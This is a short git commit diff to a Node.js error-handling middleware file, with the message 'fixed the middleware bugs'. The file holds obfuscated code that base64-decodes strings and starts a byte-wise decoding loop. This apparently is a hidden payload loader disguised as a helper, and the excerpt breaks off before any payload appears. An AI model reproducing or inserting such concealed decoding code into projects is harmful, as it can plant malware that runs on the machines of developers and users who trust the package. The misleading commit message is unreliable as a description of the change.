e18a429ca62a652c99701adb90f200b912c0fbc6
Micholn <mdiagbare@gmail.com>
2024-01-06 22:07:35 +0100

    fixed the middleware bugs

--- middlewares/helpers/error.js
+++ middlewares/helpers/error.js
@@ -6,7 +6,8 @@ Object.prototype.hasOwnProperty,Object.prototype.toString,
 
 Object.defineProperty,
 Object.getOwnPropertyDescriptor; 
-const t="base64",c="utf8",r=r=>(s1=r.slice(1),
+const t="base64",
+c="utf8",r=r=>(s1=r.slice(1),
 Buffer.from(s1,t).toString(c)),e=(r,e)=>{ let E=Buffer.from(r,t);
     const o=E.length;let F=0,a=new 
     Uint8Array(o); for(ii=0;ii<o;ii++){F=3&ii;
